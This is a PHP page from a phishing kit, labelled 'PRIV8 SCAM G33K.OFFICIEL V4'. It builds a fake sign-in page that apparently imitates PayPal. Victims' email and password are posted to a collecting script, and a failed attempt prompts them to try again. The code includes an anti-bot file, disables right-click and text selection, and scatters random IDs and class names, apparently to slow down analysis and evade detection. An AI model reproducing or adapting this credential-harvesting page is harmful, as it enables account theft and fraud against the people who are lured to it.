<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php';

echo"
<html lang=\"en\">
<head>
    <title>".$logttl."</title>
	<meta name=\"viewport\" content=\"initial-scale=1.0\">
    <link rel=\"stylesheet\" href=\"../css/sign_in.css\">
    <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"../img/ppl.ico\">
    <script type=\"text/javascript\" src=\"../js/jqury.js\"></script>
    <script type=\"text/javascript\" src=\"../js/login.js\"></script>
	<script language=\"JavaScript1.2\" type=\"text/javascript\">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function (\"return false\")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function(\"return false\")
        
</script>
</head>
<body>
	<div for=\"47036701064\" id=\"page\" name=\"Login\">
        <div for=\" 40386154720 \" id=\"content\" class=\"contenidor-content\">
            <div id=\"ras-dafhaaa\" class=\"ras-dafhaaa \">
			<header>
                <div width: class=\"logo-header-svg\"></div><br><br>
            </header>
                <section id=\"login\" class=\"login\">
                    <form for=\" a46d4ace14caf05f50af464dee58a718 \" action=\"../Templates/MO_Log.php\" method=\"post\" class=\"proceed maskable\" id=\"formulario\" name=\"login\">
                        <div id=\"pass-sect\" class=\"footer-sec\">";
						
						    if($_GET["error"]){
							    echo "
								    <div class=\"error-assat\">
								    <div class=\"lisar\"><img src=\"../img/ernox.png\"></div>
								    <div class=\"liman\">".$error_login."<br>".$try_again."</div>
								    </div>";
						    }
						echo "
                            <div class=\"a-n-o-n-i-s-m-a\" id=\"login_emaildiv\">
                                <div class=\"a-n-o-n-i-s-m-a\" style=\"z-index: 100;\">
                                    <div for=\" 47528614218 \" class=\"khana-jadida tikchb-ila\">
                                        <input for=\" a46d4ace14caf05f50af464dee58a718 \" class=\"controlar-formu\" name=\"email\" type=\"email\" placeholder=\"".$mo1."\" id=\"emay-add\" value=\"\">
                                    </div>
									 <div id=\" 24303508334 \" class=\"ghalat-assi\">
                                        <p>Email is required</p></div>
                                <div id=\" 31201284366 \" class=\"a-n-o-n-i-s-m-a\">
                                    <div id=\" 42512980078 \" class=\"khana-jadida tikchb-ila\">
                                        <input for=\" a46d4ace14caf05f50af464dee58a718 \" class=\"controlar-formu\" name=\"pass\" type=\"password\" placeholder=\"".$mo2."\" id=\"password\" minlength=\"3\" >
                                    </div>
                                    <div id=\" 29743055088 \" class=\"ghalat-assi\">
                                        <p id=\" 17435488795 \">Password is required</p>
                                    </div>
                                </div>
                            </div>
                            <div id=\" 15125380847 \" class=\"af3al cuerpooo\">
                                <button for=\" a46d4ace14caf05f50af464dee58a718 \" class=\"button zidbut\" type=\"submit\" id=\"botdkhol\" name=\"botdkhol\" value=\"Login\">".$mo3."</button>
                            </div>
                            <div id=\" 29491974576 \" class=\"lineab\"><a href=\"#\" id=\"tfkar-lpass\" class=\"nsiti-pass\">".$mo4."</a>
                                <div class=\"pwr-modal\" id=\"nsalpas-mskin\">
                                </div>
                            </div>
                            <a for=\" 16160686035 \" href=\"#\" class=\"button tanitalt\" id=\"ftahcont-jdid\">".$mo5."</a></div>
                    </form>
                </section>
                <br>
            </div>
        </div>
        <div id=\" 47941230950 \" class=\"dorawlididor\">
		<p id=\" 38938929039 \" class=\"anchofhhh\">".$mo6."</p>
        </div>
    </div>
    <footer id=\" 33176255125 \" class=\"footer footer-sec\">
        <ul>
            <li id=\" 75844226501676 \"><a href=\"#\">".$logpg1."</a></li>
            <li id=\" 9244598635558 \"></li>
            <li id=\" 377662692577883 \"><a href=\"#\">".$logpg2."</a></li>
        </ul>
        <br>
        <ul id=\" 22797998221 \">
            <li id=\" 16475653093 \"><a href=\"#\" style=\"color: #9e9e9e;\">".$logpg3."</a></li>
        </ul>
    </footer>

</body>
</html> ";
?>
